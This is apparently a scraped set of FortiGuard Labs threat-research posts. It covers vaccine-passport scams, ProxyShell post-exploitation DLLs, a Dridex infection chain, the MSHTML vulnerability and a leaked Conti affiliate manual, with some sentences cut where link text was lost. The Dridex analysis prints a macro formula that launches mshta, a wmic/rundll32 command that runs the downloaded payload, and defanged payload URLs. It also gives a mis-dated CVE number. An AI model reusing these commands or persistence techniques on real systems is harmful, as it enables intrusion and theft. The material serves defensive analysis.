@@ -1,0 +1,658 @@
+The battle against COVID has been waged for almost two years. With over 2 billion people around the globe now fully vaccinated, some countries have introduced a vaccine passport (certificate) program to allow people with proof of vaccination to travel, return to the office, and participate in public events.
+:\/:
+For a time, the United Kingdom considered having nightclubs and other similar indoor venues require proof of vaccination for entry by the end of September. However, that idea has since been rescinded. In the United States, President Joe Biden recently mandated that certain members of the workforce be vaccinated, and proof of vaccination may be required. Other activities, like shopping or travel, may be impacted as people abuse the honor system. In the EU, digital COVID certificates already make travel between member states easier. 
+:\/:
+Overall, for a variety of purposes, global demand for proof of vaccination is increasing. Because of this trend, opportunistic cybercriminals have begun selling counterfeit vaccine passports on the black market. While this is not necessarily new, unlike other criminal activities, this strategy is going mainstream. 
+:\/:
+ has now begun to encounter offers of fake vaccine passports as lures in email scams. Successfully enticing the general population to open a malicious email attachment with the promise of receiving an illegal product may be a first. It reflects how polarizing this issue is and why cybercriminals think that they can successfully exploit it. 
+:\/:
+This advertisement for a fake COVID vaccine passport requests payment in bitcoin. As of writing this blog, this bitcoin address has had zero transactions, and no user seems to have fallen for this scam. We also don't know if these criminals ever deliver a fake vaccine passport or if it is just a regular phishing attempt (or both). But what's clear is that scammers ask the target for personally identifiable information (PII) along with USD 149.95 worth of Bitcoin for a potentially double windfall.
+:\/:
+Other, more official-looking emails have also been seen using the address of the well-known Center for Disease Control (CDC) of the United States to appear legitimate. Below is a fake CDC email that was recently spotted in the wild.
+:\/:
+The link in this email did not lead to any official document but instead redirected the user to a legitimate server that had been compromised. While the link has been taken down, indicators suggest that this compromised server was used in a phishing attempt.
+:\/:
+FortiGuard Labs has also found various markets on the dark web offering fake vaccine passports. As expected, a wide range of products and services are available, from blank vaccine cards to verifiable passports that can be checked against legitimate vaccine databases worldwide. A single blank vaccination card can be found for as low as $5.00, while buying in bulk may increase a buyer's savings. Of course, there is no guarantee that a purchaser will ever actually receive these documents.
+:\/:
+The price increases for those buyers who want their information to be added to legal databases showing they have received the vaccine.
+:\/:
+Because the market is being flooded with opportunistic counterfeiters, some sellers have begun offering sales and discounts. Others provide an escrow service in an attempt to protect the buyer and the seller. 
+:\/:
+Demand for fake vaccine passports seems to be growing due to the large population of people who refuse (or are unable) to take the vaccine but want to avoid restrictions. Without missing a beat, email scammers and black-market criminals have acted on this demand. FortiGuard Labs recommends practicing due diligence when receiving emails and keep an eye out for these types of scams. 
+:\/:
+Because these criminals use phishing techniques to socially engineer and lure victims into following steps laid out by the attacker, it is vital to address these challenges.
+:\/:
+The most effective tool in the fight against spam and malicious email links and attachments is a secure email gateway with advanced detection and response technologies. Fortinet's 
+:\/:
+ not only sees and effectively stops such threats but can be easily integrated into an organization's larger security strategy, rather than operating as a stand-alone solution, enabling organizations to deploy 
+:\/:
+Organizations are also strongly encouraged to conduct ongoing training designed to educate and inform personnel about the latest phishing/spearphishing techniques and how to spot and respond to them. This should include encouraging employees to never open attachments from someone they don't know and always treat emails from unrecognized/untrusted senders with caution. 
+:\/:
+ and spearphishing attacks are being delivered as part of social engineering distribution mechanisms, end-users within an organization must also be made aware of the various types of attacks currently in use. This can be accomplished through regular training sessions and impromptu tests using predetermined templates originating from an organizations' internal security department. Simple user awareness training on how to spot emails with malicious attachments or links can also help prevent initial access into the network.
+:\/:
+ threat research and intelligence organization and the FortiGuard Security Subscriptions and Services 
+:\/:
+ Gives unauthorized users the ability to access and send emails from any user within the organization 
+:\/:
+FortiGuard Labs recently discovered an unidentified threat actor leveraging ProxyShell exploits using techniques that have yet to be reported. Multiple instances of 
+:\/:
+ had detected malicious DLLs in memory, and we uncovered these new techniques while consulting with one of the organizations that had been compromised by ProxyShell. Through active threat hunting, we were then able to determine that other organizations had also been compromised.
+:\/:
+The DLLs, which were previously unknown based on their SHA256 file hashes, were used to perform active reconnaissance, obtain hashed passwords via 
+:\/:
+, and perform pass-the-hash authentication to establish persistence via Exchange Application Impersonation. This blog intends to provide an analysis of these DLLs. We documented the malicious activity associated with them by recreating the incidents in a lab environment. The goal is to help the public and future customers determine if they have related activity in their environment and take appropriate action.
+:\/:
+. At first, they seemed to match what most organizations were already reporting. Exploit details, from the directories to the types of web shells used, matched almost verbatim. The difference was when web shells performed post-exploitation activity via DLLs loaded into memory, which triggered events within FortiEDR.
+:\/:
+FortiEDR detected these DLLs because they loaded into memory space allocated for vbc.exe, the Visual Basic Compiler for .NET applications, and were loaded from the w3wp.exe process, which is used to run Microsoft Exchange's Outlook Web Application. This, along with FortiEDR's machine learning algorithm, determined that these files were likely malicious.
+:\/:
+The figure below shows w3wp.exe injecting a thread into the vbc.exe process and accessing services on the Exchange server.
+:\/:
+Next, the web shells were used to connect to numerous domain controllers within the environment, and we found the Thor.dll file in memory. This DLL is used to authenticate to the domain, modify security permissions, create domain accounts, and add accounts to Exchange roles. I analyze the Thor.dll in detail later. 
+:\/:
+The event shown in Figure 2 occurred just after an HTTP POST was sent to one of the web shells and seconds before a domain account was created within the environment. A legitimate domain service account created the account within the organization. Of note, when FortiEDR was in protection mode, all this activity was blocked. No domain accounts or further activity was seen in those situations.
+:\/:
+Also, the domain accounts for the other environments were never used for interactive authentication, which told us that the threat actor was likely interested in using the accounts later in this campaign. They also only had domain user access with no elevated privileges, indicating they were not interested in using the accounts to perform administrative level tasks.
+:\/:
+To fully understand what took place when these DLLs were loaded into memory, we analyzed their functionality and behavior, explained in detail in the following section.
+:\/:
+There was a total of 22 DLLs found in memory by FortiEDR during the time of these events. Not all were tagged as malicious, but FortiEDR captured them regardless as they were related to the malicious events. Fortunately, all these DLLs were .NET compiled, so decompiling them was relatively trivial. 
+:\/:
+Some of the names appear to be randomly named; however, others are named overtly with their intended function. Further analysis shows that the randomly named DLLs were loaders for the overtly named DLLs. This can be seen by looking within the "xml()" method of the decompiled code for each loader DLL.
+:\/:
+The "xml()" method loads the base64 version of the DLL and calls a method within the DLL. In this example, it was the "Elite" method within the "Axiomatic" class. 
+:\/:
+The loader DLLs are also responsible for taking the output from the method calls and relaying it back to the web shell HTTP session that it was called from so the threat actor will get the output results from the DLL execution. This provides the threat actor with results from the HTTP session from which they interacted with the web shell.
+:\/:
+By using these method calls and linking them to the loaded DLLs, our team could recreate this activity using PowerShell. The results are shown below and are broken down by each DLL, along with a screenshot showing the output sent back through the web shell HTTP session.
+:\/:
+This DLL gets the Exchange Control Panel (ECP) Web.config file from the Exchange server. This gives the threat actor access to some of the internal ECP configurations. More information about the web.config file can be found 
+:\/:
+This DLL gets all the domain groups from Active Directory. This gives the threat actor information about the hierarchy of the environment in which they are working.
+:\/:
+This DLL gets the DNS Type A entries, which can be used to target additional machines within the environment. It also provides the threat actor with a forward and reverse lookup database when translating hostname to IP and vice-versa.
+:\/:
+This DLL gets the list of users in the user group "Organizational Management." Members within this group have the necessary access on the Exchange server to create and/or modify roles and permissions.
+:\/:
+This DLL gets the list of exchange servers within the domain so the threat actor can target other Exchange servers if needed. Some environments are set up in a hierarchy, where different roles of Exchange are on different servers. A threat actor would need this information to know which servers to target.
+:\/:
+This DLL gets information about the drives of the localhost. This information can be useful to the threat actor to determine which hard drive may contain Exchange databases.
+:\/:
+This DLL gets a list of workstations within the domain, which gives the threat actor an idea of how large an environment is and a good starting point for launching additional attacks.
+:\/:
+This DLL gets information about the system, such as build name, hardware info, OS, etc. This provides the threat actor with the necessary information to launch further exploitation attacks or maintain persistence and access.
+:\/:
+This DLL returns a list of services running on the local system, which gives the threat actor a list of security software present on the system. For example, the threat actor may have to use bypass techniques to avoid certain types of security products.
+:\/:
+This DLL reaches out to given domain controllers (passed as a parameter) to see if they're vulnerable to Zerologon, and if so, responds with usernames and hashed passwords. It then restores the computer hash for the domain controller to its original state. This is a documented method using Zerologon and can be read about more 
+:\/:
+This DLL attempts to authenticate with credentials from the previous Zerologon dump and create domain accounts attempting to masquerade as healthmailbox accounts. It also creates a role-based access control (RBAC) assignment within Exchange that gives it the ApplicationImpersonation role built into Microsoft Exchange. This allows the actor to access and send email from any mailbox within the environment. Furthermore, it locks down the permissions of those objects.
+:\/:
+We can also see the role assignment created within Exchange, along with the role type, "ApplicationImpersonation".
+:\/:
+ApplicationImpersonation is meant to be used by service applications that need to access multiple mailboxes and "act as" the mailbox owner. However, in this case, it allows the attacker to retain access to the domain's mailboxes. More information about Application Impersonation using EWS can be found on Microsoft's documentation page (
+:\/:
+https://docs.microsoft.com/en-us/exchange/client-developer/exchange-web-services/impersonation-and-ews-in-exchange
+:\/:
+). This specific email compromise technique is rarely seen, and the intent behind this activity is still largely unknown as the threat actor wasn't seen using the created accounts to impersonate mailboxes in a victim's environment.
+:\/:
+FortiEDR was able to capture DLLs found in memory that had been executed via web shells created from ProxyShell vulnerabilities. In the situations where the DLLs were not blocked (simulation blocks), there was no follow-on activity, nor was an intent identified. But the threat actors were clearly interested in maintaining access to the organization's mailboxes using techniques rarely used and largely undocumented.
+:\/:
+ threat research and intelligence organization and the FortiGuard Security Subscriptions and Services 
+:\/:
+                       Collects sensitive information from victims’ computers and delivers and executes malicious modules on victims’ device.
+:\/:
+Dridex is a Trojan malware, also known as Bugat or Cridex, which is capable of stealing sensitive information from infected machines and delivering and executing malicious modules (dll).
+:\/:
+ email campaigns in the wild that included a specially crafted Excel document attachment. I did a deep research on one of them and discovered that once the malicious Excel document is opened on a victim’s machine, it downloads a new variant of Dridex.
+:\/:
+In this analysis, I will elaborate how the Excel document downloads Dridex, how this version of Dridex runs on a victim’s device, what sensitive information it collects, and how it delivers malicious modules (dll).
+:\/:
+Figure 1.1 shows one of the recent phishing emails with a malicious Excel attachment infected with Dridex.
+:\/:
+As you can see, this email disguises itself as sending Import Tariffs data to a customer, and then asking him/her to view the details by opening the  attached Excel file (in this case, “HF7.TRANS 2021.08.09.xlsb”).
+:\/:
+When the recipient opens the attached Excel document, it contains a message at the top of the document in bold red letters asking them to “Please enable macros.” However, Excel displays a yellow “Security Warning” bar telling the end user that macros are currently diabled, with the implication that clicking the button “Enable Content” may be risky, as shown in Figure 2.1.
+:\/:
+Looking into the internal details of the Excel file, I found that it not only used auto-run Macro(VBA) but also 
+:\/:
+. There is an auto-run function called Workbook_Open() in the Macro(VBA), which is automatically called when the Excel file is opened.
+:\/:
+It only sets the value Environ("allusersprofile")& "\KgmsgJbgP.sct" (“C:\ProgramData\KgmsgJbgP.sct” in my testing environment) to the “$A$1” cell of a sheet called “Macro1”.
+:\/:
+“Macro1” is a hidden sheet that contains and executes the Excel 4.0 Macro, which is defined in the file “xl\workbook.xml” as shown in Figure 2.2.
+:\/:
+Excel 4.0 macros use formulas in various cells to execute code. As long as you give it a starting cell, it executes code from top to down, then from left to right.
+:\/:
+After the auto-run Macro(VBA) is executed, the Excel 4.0 Macro is executed automatically starting from the cell “Macro1!$A$4”.
+:\/:
+The Excel 4.0 Macro extracts data from a bunch of cells within the “Macro1” sheet into a local file, whose file path is saved in $A$1, which is “C:\ProgramData\KgmsgJbgP.sct”. The extracted data is an HTML application (.hta file) with a piece of VBScript code. The last step of the Excel 4.0 Macro is to execute this “KgmsgJbgP.sct” file using the “mshta” command, which is =EXEC(CONCATENATE("mshta ", CHAR(34), A1, CHAR(34))).
+:\/:
+The final command to be executed is “mshta.exe C:\ProgramData\KgmsgJbgP.sct“. “mshta.exe” is a Windows default program that is used to execute an html application (.hta file) with HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript.
+:\/:
+The VBScript code, as shown in figure 3.1, includes an array of ten URLs (refer to the “IOCs” section below for details) that link to the Dridex payload. It downloads Dridex from these ten URLs in a for-loop into a local file, “%ALLUSERSPROFILE%\\icXBOuZukiASGnpfVowZ.dll”, that is hardcoded in this VBScript code. When Dridex is downloaded successfully, it then executes “wmic.exe” (the WMI command-line) to create a new process of “rundll32.exe”.
+:\/:
+wmic process call create \"Rundll32.exe %ALLUSERSPROFILE%\\icXBOuZukiASGnpfVowZ.dll ReportDeviceAdd\"
+:\/:
+Finally, Rundll32.exe loads the Dridex payload file “icXBOuZukiASGnpfVowZ.dll” and the calls its export function, named “ReportDeviceAdd”, to execute its malicious functions.
+:\/:
+Figure 4.1 shows the export function list of the payload file of Dridex in IDA Pro. It contains two functions: DllEntryPoint() is the entry function for this dll. And FWroeeWqoinnmw() is the real entry function. An odd thing here is that there is no function for “ReportDeviceAdd”, which should be the starting point of this Dridex variant.
+:\/:
+To figure this out, we analyzed the internal strategy Rundll32.exe uses to load a module and then call its export function. Figure 4.2 shows the export function list of the Dridex payload file after it is unpacked. It provides six export functions. The fourth function is “ReportDeviceAdd”.
+:\/:
+Rundll32.exe calls the API LoadLibrary() to load the dll into the memory and then deploy it according to its PE structure.
+:\/:
+It then calls API GetProcAddress() with the function name “ReportDeviceAdd” to obtain the function address from the initialized module in step 2.
+:\/:
+This payload file also contains a packer-like program to protect itself from being researched by people. It does the unpacking in step 2 when the payload file’s DllEntryPoint() is called.
+:\/:
+From this point, Rundll32.exe is able to obtain ReportDeviceAdd by calling the API GetProcAddress().
+:\/:
+Some APIs are called in a crafted way to raise an exception (0x80000003) on purpose. It then captures the exception in the exception handler function to actually call the API.
+:\/:
+Dridex collects sensitive data from the victim’s infected device, which is then placed into a formated packet, encrypted, and sent to the C2 server.
+:\/:
+Figure 5.1 is a screenshot of the first packet to a C2 server that was about to be encrypted. All the packets to the C2 server have the same packet format. As an example, I’ll elaborate on the format of the packet below, which has been separated into many fields by a red pipe in the screenshot.
+:\/:
+The selected part is common data for all packets, which is refered as a “packet header” in this analysis.
+:\/:
+- The victim’s ID string contains the computer name, underscore, and an MD5 hashcode of a string that includes the computer name, user name, and the Windows system’s install date.
+:\/:
+- The hard drive’s volume information is an MD5 value made from data of the volume  information of “C:\” and the Windows installation date.
+:\/:
+- 0x11C1B11D is a mixed data set of Windows version information, which is obtained from the result of the APIs GetVersionEx() and GetSystemInformation().
+:\/:
+- Dridex has five packet type IDs in this variant used to notify the C2 server. They are 0x18F8C844, 0x69BE7CEE, 0x11041F01, 0xD3EF7577, and 0x32DC1DF8.
+:\/:
+The field values of every Dridex packet header (except for packet type ID) are the same for all the packets on the same machine.
+:\/:
+The collected data (starting from offset 0x55) is appended to the packet header, which has two fields—the collected data size (four bytes in network byte order) and the collected data followed.
+:\/:
+As with its previous version, the IP address and port of C2 servers are hardcoded in the data. Below is the IP list in binary of the three C2 servers.
+:\/:
+The malware chooses one IP address and port pair in an for-loop. Once one connection to the C2 server is successfully established, it is used throughout the process life.
+:\/:
+“0x18F8C844” is the packet ID for the very first packet. The collected data consists of the entire installed software (including software name and version) and all environment variables defined in the infected system.
+:\/:
+It obtains the installed software information one-by-one by enumerating the sub-keys under the key “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall” in the system regisity.
+:\/:
+It also steals the values of environment variables defined in the victim’s system. On my testing machine, they are  
+:\/:
+ALLUSERSPROFILE, APPDATA, CommonProgramFiles, COMPUTERNAME, ComSpec, FP_NO_HOST_CHECK, HOMEDRIVE, HOMEPATH, LOCALAPPDATA, LOGONSERVER, NUMBER_OF_PROCESSORS, OS, Path, PATHEXT, PROCESSOR_ARCHITECTURE, PROCESSOR_IDENTIFIER, PROCESSOR_LEVEL, PROCESSOR_REVISION, ProgramData, ProgramFiles, PSModulePath, PUBLIC, QT_AUTO_SCREEN_SCALE_FACTOR, SystemDrive, SystemRoot, TEMP, TMP, USERDOMAIN, USERNAME, USERPROFILE, VS140COMNTOOLS, and windir
+:\/:
+It calls the API GetEnvironmentStringsW() to obtain all the values of the above environment variables. Figure 6.1 shows a partial set of the name-value pairs obtained in memory.
+:\/:
+Once the first packet is finished, Dridex encrypts the packet and sends it to the C2 server using the HTTP POST method. It invokes a group of APIs to send and receive the data, such as InternetConnectW(), HttpOpenRequestW(), HttpSendRequestW(), HttpQueryInfoW(), and InternetReadFile().
+:\/:
+Unfortunately, its C2 servers were down during my analysis, so it was unable to send/receive data to/from the C2 servers. But according to its code workflow, I could create a fake C2 server of Dridex to simulate the server’s behaviors to receive and reply to Dridex to continue my research. The following analysis is based on this simulated data.
+:\/:
+After receiving the response packet to the first packet from the C2 server, it sends the second packet (packet ID 0x11041F01) with no collected data. It should reply with a malicious module (dll file) in the response packet. Dridex verifies the response packet by comparing the packet’s hash code, which is the first four bytes of the packet. Next, Dridex sends another packet (packet ID 0xD3EF7577) to inform the C2 server that it has successfully received the module.
+:\/:
+The second response packet contains an encrypted module (dll) . After Dridex verifies the received packet, it decrypts the module—which is like the memory data displayed at the bottom of Figure 7.1.
+:\/:
+Dridex then proceeds to deploy this malicious module onto the victim’s machine and then creats a scheduled task to run the module. Let’s see how it does this.
+:\/:
+To keep the module running secretly on the victim’s machine, Dridex uses a Windows default program to load and run it. It randomly chooses a pair of Windows program (exe) and a dll file from “%windir%\system32” that the chosen program has to load. Next, Dridex can override the chosen dll file with the received module. Hence, once the chosen program starts, the malicious module within the chosen dll is executed.
+:\/:
+Figure 7.2 is a screenshot of the just-chosen pair of Windows program and the dll file from “%windir%\system32\”
+:\/:
+Dridex copies the chosen Windows program (this time, it’s“sdclt.exe”) into a newly-created folder, with random string (like “Okuo”) under the “%appdata%” folder. Meanwhile, it reads the chosen dll (“slc.dll”) into memory and then it overrides its data with the malicious module obrained from the response to the second packet. Finally, Dridex calls the API WriteFile() to save it to the same folder of the copied Windows program. From now on, whenever the Windows program—“sdclt.exe”—starts, it loads and executes the “slc.dll” that contains the malicious module.
+:\/:
+Dridex then creates a scheduled task in the infected Windows system to achieve persistence on the victim’s machine. The action of the task is just to start the copied Windows program (i.e. “sdclt.exe”) and it is triggered to repeat this action every 30 minutes.
+:\/:
+Figure 7.3 shows a screenshot of “Task Scheduler” with the added task named “Tixvzwbtojdsmg”, as well as the copied “sdclt.exe” and “slc.dll” files in the folder “Okuo”.
+:\/:
+Other than adding to the scheduled task, it also calls the API CreateProcessW() to run “sdclt.exe” once just after it has been deployed.
+:\/:
+Before Dridex exits, it sends a packet with the ID 0x69BE7CEE to inform the C2 server that the malicious payload has been successfully installed on the victim’s machine. Figure 7.4 is a code snippet about to generate and send this packet.
+:\/:
+You have now learned how this Dridex campaign is run, including the phishing email, how the malicious code inside the attached Excel document is executed to extract an HTML application file, and finally, how a Rundll32.exe is called to execute the downloaded Dridex payload file.
+:\/:
+I elaborated on how this variant of Dridex communicates with its C2 server, the fields contained in the packet, how it asks the C2 server for a malicious module, and how the module is deployed onto the infected system.
+:\/:
+I also made a flow chart of how Dridex communicates with its C2 servers below in Figure 8.1. It clearly shows what packet and data was sent to the C2 server and when it received the malicious module. It will help you better understand the entire process.
+:\/:
+FortiMail users are protected by FortiGuard AntiVirus, which detects the original Excel document as a malicious attachment in the phishing email.
+:\/:
+
+"hxxps[:]//loans[.]uhuruloans[.]com/wp-includes/sodium_compat/namespaced/Core/ChaCha20/X8av4FUl7STEot3[.]php"
+:\/:
+
+"hxxps[:]//practice[.]haylawdesign[.]com/wp-content/themes/twentynineteen/template-parts/content/jE4zYiuJ0iIw[.]php"
+:\/:
+
+"hxxps[:]//kings[.]inforwizztechnologies[.]com/wp-content/plugins/aapside-master/elementor/widgets/tfOSpcBiZpffptj[.]php"
+:\/:
+
+"hxxps[:]//pizzaplus[.]com[.]ng/wp-content/themes/twentytwentyone/template-parts/content/TZ6qTYLx7l[.]php"
+:\/:
+ threat research and intelligence organization and the FortiGuard Security Subscriptions and Services 
+:\/:
+On September 7, 2021, Microsoft disclosed an active in-the-wild attack affecting Microsoft Windows. This vulnerability, CVE-2020-40444, is a remote code execution vulnerability in MSHTML. It does not currently have a patch, MSHTML is also referred to as Trident, is a legacy proprietary browser engine specific to Internet Explorer and Windows platforms. In-the-wild attacks on targets were observed to be using specially crafted malicious Microsoft Office documents. Like most such attacks, targets have to be compelled or lured to open the malicious document for it to run successfully. 
+:\/:
+This blog provides information on the vulnerability, how the attack works, and Fortinet product protections in place to address this vulnerability. Additional information can be found in the 
+:\/:
+According to Microsoft, "An attacker could craft a malicious ActiveX control to be used by a Microsoft Office document that hosts the browser rendering engine." The threat actor uses a specially crafted Office file that uses the Internet Explorer engine to render a predetermined web page that the threat actor has crafted or compromised. 
+:\/:
+However, for an attacker to successfully leverage this vulnerability, the target must be socially engineered into opening the maliciously crafted Office file that uses an ActiveX control to download a seperate malicious payload. The threat is then executed using CPL file execution to complete its task. CPL file execution uses a control panel wherein a CPL file exports a function called a CPLApplet that Windows recognizes as a control panel application.
+:\/:
+What makes this vulnerability unique is the usage of legacy applications that exist in Microsoft Windows. Internet Explorer and ActiveX have been part of the Microsoft Windows platform for over three decades. First introduced in 1996 alongside Internet Explorer 3.0, ActiveX enables interactions between Internet Explorer and the host operating system. Because of the privileges provided to ActiveX, malicious ActiveX controls can have access to critical information, such as keystrokes and sensitive system data. Although deprecated, Windows 10 and Microsoft Office still support ActiveX controls as many organizations depend on this technology. 
+:\/:
+To complicate matters further, Microsoft ended all Internet Explorer and ActiveX support on August 31, 2020. Internet Explorer is expected to be officially retired on June 15, 2022, and will not be included in Windows 11. There has been no official announcement regarding the inclusion of ActiveX in Windows 11.
+:\/:
+, FortiGuard Labs has IPS coverage in place for this vulnerability as: MS.Office.MSHTML.Remote.Code.Execution
+:\/:
+FortiGuard Content, Disarm, and Reconstruction (CDR) can protect users from this attack by enabling the following option:
+:\/:
+Regarding mitigation, FortiGuard Labs recommends disabling all ActiveX controls in Microsoft Internet Explorer, which will address this issue. This can be performed by editing the registry. Specific details on how to perform these edits have been included in the related 
+:\/:
+. Please note that this should be done carefully, as incorrectly editing the registry can cause severe operating system issues.
+:\/:
+Because it has been observed that this threat is using phishing techniques to deliver malicious office documents, it is important to address these challenges.  This requires selecting and implementing a Secure Email Gateway that can not only see and effectively stop threats, but easily integrate into a larger security strategy. The AAA rated 
+:\/:
+ fully integrates into the Fortinet Security Fabric, enabling organizations to deploy FortiMail as part of a complete end-to-end security solution.
+:\/:
+Organizations are also strongly encouraged to conduct ongoing training sessions to educate and inform personnel about the latest phishing/spearphishing attacks. This should include encouraging employees to never open attachments from someone they don't know and always treat emails from unrecognized/untrusted senders with caution. 
+:\/:
+ and spearphishing attacks have been delivered via social engineering distribution mechanisms, end-users within an organization must be made aware of the various types of attacks being delivered. This can be accomplished through regular training sessions and impromptu tests using predetermined templates originating from an organizations' internal security department. Simple user awareness training on how to spot emails with malicious attachments or links can also help prevent initial access into the network.
+:\/:
+ threat research and intelligence organization and the FortiGuard Security Subscriptions and Services 
+:\/:
+ (OT) may not get the same attention as IT, but its connection to our physical world, including critical infrastructure, means that a disruption can impact lives long after the workday is over. FortiGuard Labs has documented steady interest from threat actors in identifying OT vulnerabilities and then building them into exploit tools. The result is that script kiddies are now at least as likely to find your exposed OT devices as APT groups focused explicitly on exploiting unprotected and unpatched ICS. 
+:\/:
+Cybersecurity is a long game, and not all actions have an immediate effect. But increasing pressure from critical voices is having an impact. In response to escalating ransomware incidents and their threat to the safety and security of the American people, the White House has announced the formation of a cross-government task force to develop and coordinate defensive and offensive measures against ransomware. 
+:\/:
+At the same time, groups like Interpol and the World Economic Forum's Centre for Cybersecurity have begun international dialogues on overcoming geopolitical limitations to enable more and better cooperation to detect and stop threats and cybercriminal organizations. Public-private actions taken in the first half of 2021 may be a game-changer. Public sector organizations are now partnering with industry vendors, threat intelligence organizations, and global organizations to combine resources and real-time threat intelligence to take direct action against cyber adversaries. Fortinet is proud to play an active role in many of these activities.
+:\/:
+Some results of this cooperation was the coordinated takedown of Emotet, one of the most prolific malware operations in recent history, and the disruption of the Egregor, NetWalker, and Cl0p ransomware operations which represent significant wins by global governments and law enforcement to curb cybercrime. Also encouraging was the voluntary exit of cybercrime groups such as DarkSide, Avaddon, and Ziggy and the refusal by some underground forums to deal in ransomware in the aftermath of the Colonial Pipeline attacks. In addition, the original developer of TrickBot was arraigned on multiple charges in June. Also, the 
+:\/:
+This response to increased pressure by crucial players represents a significant step forward in governments and law enforcement efforts to curb cybercrime.
+:\/:
+But this cooperation also needs to be combined with advances in technology and threat intelligence. FortiGuard Labs has begun analyzing the specific functionality inherent to detected malware by detonating threat samples to determine their intended objectives. The result is a list of adverse outcomes that current 
+:\/:
+ is designed to accomplish, including escalating privileges, evading defenses, moving laterally across internal systems, and exfiltrating compromised data. 
+:\/:
+Documenting this higher-resolution threat intelligence reveals valuable takeaways about how attack techniques are evolving currently that organizations can use to better secure their critical digital resources. For example, 55% of observed privilege escalation functionality leveraged hooking, and 40% utilized process injection. The takeaway is that there is a specific focus by cybercriminals on defensive evasion and privilege escalation tactics. 
+:\/:
+The data used in this Global Threat Landscape Report was drawn from Fortinet sensors collecting billions of threat events worldwide. It encapsulates the collective intelligence of FortiGuard Labs. This report provides global and regional perspectives on threat trends and cybersecurity from the first half of 2021. It also leverages the MITRE ATT&CK framework to classify adversary tactics and techniques to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets. This knowledge empowers defenders to better identify and respond to current and emerging threats that put their participation in today's global economy at risk.
+:\/:
+ threat research and intelligence organization and the FortiGuard Security Subscriptions and Services 
+:\/:
+ caused a disruption in the distribution of oil and gasoline across the East coast on the United States (ironically, it was the billing system taken offline and not 
+:\/:
+ devices controlling the supply). The one on JBS Foods in Brazil (REvil) led to concerns about a potential global meat shortage. And the one that targeted managed service provider 
+:\/:
+ (REvil) was a supply chain attack which resulted in downstream customers being impacted with ransomware attacks.
+:\/:
+Prior to these attacks, the tactics, techniques, and procedures (TTPs) of threat actors were discovered either by forensic analysis conducted by incident response teams or via static analysis of the malware itself. However, a disgruntled self-proclaimed “pentester” of the Conti group recently leaked various insider files to the public. Contained within this leak are zipped password protected files, operational how to documents, and other reference files created by the group for affiliates. Because of this leak, we have been given a sneak peek into the operations of a Ransomware operation from the affiliate perspective.
+:\/:
+The Conti ransomware group, in operation for over a year, operates a Ransomware-as-a-Service (RaaS) that has been connected to multiple attacks, including a recent high-profile attack on the Irish Health Service that caused a massive disruption to services. In that attack, not only were services disrupted and brought to a halt, but database servers (SQL) and over 700GB of PII was downloaded and exfiltrated by the threat actors. So, their modus operandi is not just ransom, but extortion by providing proof that valuable data has been exfiltrated.
+:\/:
+It will touch on several interesting observations lifted from the manual. Although other files and documents were released, this support manual contains information for “affiliates” and offers a rare glimpse into the Ransomware-as-a-Service world.
+:\/:
+A sneak peek into documentation provided to criminal affiliates and the type of support provided by a ransomware organization.
+:\/:
+A perspective into operational strategies, including the TTPs used by the Conti ransomware group, such as tools, methodologies, and an attack overview from its beginning stages to the final ransomware deployment stage.
+:\/:
+Ransomware in its current form (lock screen, payment in cryptocurrency, etc.) has been around for almost a decade, and yet still makes media headlines. From the first mass ransomware attacks that displayed various law enforcement logos to the victim (based on what locale the victim was in) demanding payment in prepaid credit cards (Reventon – 2012), to the first payments made in Bitcoin cryptocurrency (Cryptolocker -2013), and now, Ransomware-as-a-Service (GandCrab - 2018), it has become almost commonplace. So, how is it that it is still making headlines? 
+:\/:
+It is because attacks are becoming more brazen, and victims and the impact of an attack are increasingly high profile. In addition to the ongoing efforts of targeting random indiscriminate individuals and their machines, criminals are increasingly targeting major organizations and their entire environment, thereby causing noticeable disruptions. It is also worth mentioning that their tradecraft has improved, from the basic social engineering techniques via spearphishing or pirated software still used by low-level criminals, to new advanced strategies where, by the time a ransomware attack is launched, the threat actor has already been inside the victim’s network, undiscovered and undetected, sometimes for months before striking. 
+:\/:
+Another compounding factor is the new RaaS model. This maturing strategy allows vetted “affiliates” to conduct attacks, rather than the organization that developed the malware. Using a sort of franchise model, affiliates earn a hefty sum of the ransom while paying the ransomware authors a percentage of their gains. For the developers, the money comes through scalability, giving them time to refine their service rather than hunting for victims. This also means that the rate and volume of attacks necessarily increases as the number of affiliates grows. Reports by researchers estimate that ransomware attacks alone in 2020 grew over 150 percent and have netted attackers over 350 million dollars.
+:\/:
+Of course, forensic analysis shows that attackers had already successfully embedded themselves inside a network, sometimes for weeks or months at a time, to prepare for executing their attack (interestingly, in a new development, CVE-2020-1472 – Zerologon changed that to hours)
+:\/:
+. However, we didn’t have much insight into the operational tradecraft used by affiliates. We just assumed that they were well-versed in pentesting methodologies and skilled in performing their operations. And while we had heard of some ransomware gangs providing advanced attack support for their affiliates, we didn’t really know how much support was provided until now.
+:\/:
+A cursory analysis of the manual, shown above, highlights the well documented operational procedures of the Conti ransomware group. Titled 
+:\/:
+, the document provides insight into the usage (misuse) of Cobalt Strike, a legitimate post exploitation tool used by red teams, along with other how-to guidance and advice from the gang. 
+:\/:
+In figure 1, we see (highlighted in green) a suggestion to affiliates to seek out targets and companies with verifiable income by using publicly available data, such as Owler, Manta, Zoominfo, DNB, RocketReach, etc. It also provides working search engine queries to determine company revenue, e.g., "site:XYZ.com revenue" for further specifics. This information is commonly used to gauge the financial resources of lesser well-known entities, as well as to determine how much an organization is willing to pay.
+:\/:
+It also provides operational data for the affiliate once they have established a reverse shell or persistence with the victim's Windows Domain Controller. It contains instructions on how to list all domain controllers, local and domain administrators, enterprise administrators, and known domain computers inside a network, as well as how to ping all hosts. Once this traversal information has been established, it provides instructions on how to deploy the payload via 
+:\/:
+The text above (figure 2) states that once the various containers are accessed, affiliates should be looking for:
+:\/:
+Other advice includes the usage of multiple pentesting tools (post exploitation), along with the use of a variety of open source tools designed to intercept and brute force passwords at the domain controller. In the following section we look at a number of open source tools identified as the tools of choice of Conti pulled from the machine-translated of the version document.
+:\/:
+Kerberoasting is a term describing an attack on domain controllers that tries to crack the hash of a Kerberos encrypted password via brute force. Once the hash is cracked, the password is then in clear text, enabling an adversary to traverse deeper into an environment and to add accounts by leveraging compromised higher-level admin accounts. Another suggested tool for affiliates conducting Kerberoast activities is Invoke-Kerberoast.ps1, which is an open source PowerShell script found on Github and maintained by @harmj0y. It is loaded into the Cobalt Strike beacon using the powershell-import command.
